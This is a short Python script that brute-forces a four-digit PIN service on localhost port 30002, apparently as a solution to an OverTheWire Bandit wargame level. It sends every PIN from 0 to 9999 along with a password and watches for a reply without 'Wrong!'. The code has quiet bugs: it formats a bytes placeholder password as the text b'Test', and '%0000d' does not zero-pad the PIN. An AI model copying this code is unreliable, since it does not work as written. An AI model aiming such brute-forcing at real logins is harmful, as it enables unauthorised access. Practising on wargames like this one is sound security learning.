#!/usr/bin/env python3
import os
import socket
import time

def main():
    print("Starting brute force of bandit25 PIN daemon")
    target = ("127.0.0.1", 30002)
    pin_stats = []
    for pin in range(0,10000):
        pin_stats.append(0)
        pin_stats[pin] = test_pin(target, pin, b"Test")
        print("Ran PIN %d" % pin)

    print([p for p in pin_stats if p[1]])

def test_pin(host_port, pin, pw):
    # create and connect socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    s.connect(host_port)
    
    test_phrase = "%s %0000d" % (pw, pin)
    # send password from previous level + PIN
    totalsent = 0
    while totalsent < len(test_phrase):
        sent = s.send(bytearray(test_phrase, 'utf-8')[totalsent:])
        print("Sent %d so far" % sent)
        totalsent = totalsent + sent
        if sent == 0 or totalsent == len(test_phrase):
            break
            #return (pin, False, "")

    # loop over received data, waiting a couple seconds between each run. 
    print("Starting receive of bytes")
    all_recv = []
    msg = b''
    runs = 0
    while runs < 10:
        #time.sleep(0.1)
        try:
            runs = runs + 1
            chunk = s.recv(2048) 
            all_recv.append(chunk)
            # check finished or if 10 seconds go without data, close socket and end function
            if chunk == 0 or chunk == b'':
                break
        except socket.timeout:
            break
    msg = b''.join(all_recv) 
    # this sockets DONE now
    s.shutdown(0)
    s.close()

    # return pin and whether it had the password
    return (pin, *check_for_password(msg))

def check_for_password(data):
    # convert bytes to string and check if it doesn't contain error output
    msg_str = data.decode('utf-8')
    #msg_str = data
    print("Message string contains %s" % msg_str)
    # check received_data for password
    if "Wrong!" not in msg_str:
        # if found, return tuple of (pin, true, received_data_as_string)
        return (True, msg_str)
    
    # if not, return tuple of (pin, false, "")
    return (False, msg_str)

if __name__ == "__main__":
    # only allow this to run as a script
    main()

